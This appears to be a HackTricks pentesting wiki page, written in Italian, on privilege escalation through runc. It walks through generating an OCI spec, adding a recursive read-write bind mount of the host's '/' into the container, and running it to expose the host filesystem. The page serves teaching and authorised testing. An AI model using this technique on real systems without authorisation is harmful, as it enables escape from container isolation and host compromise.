# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informazioni di base

Se vuoi saperne di più su **runc**, consulta la seguente pagina:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Se `runc` è disponibile per un processo `rootful` sull'host, puoi utilizzare un bundle OCI la cui configurazione dei mount esegue ricorsivamente il bind-mount di `/` dell'host su `/` all'interno del container, esponendo il filesystem dell'host in quel mount namespace.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Il workflow documentato di `runc run` è rootful: gli esempi di runc lo definiscono "run as root". Un utente non privilegiato necessita di una configurazione rootless come `runc spec --rootless`, e runc documenta che i namespace utente devono essere abilitati per questa modalità.<sup>[[1]](#references)</sup>

## References

- [1] [runc: strumento CLI per la creazione e l'esecuzione di container](https://github.com/opencontainers/runc#using-runc)
- [2] [Specifica OCI del runtime: Mounts](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Sottoalberi condivisi](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
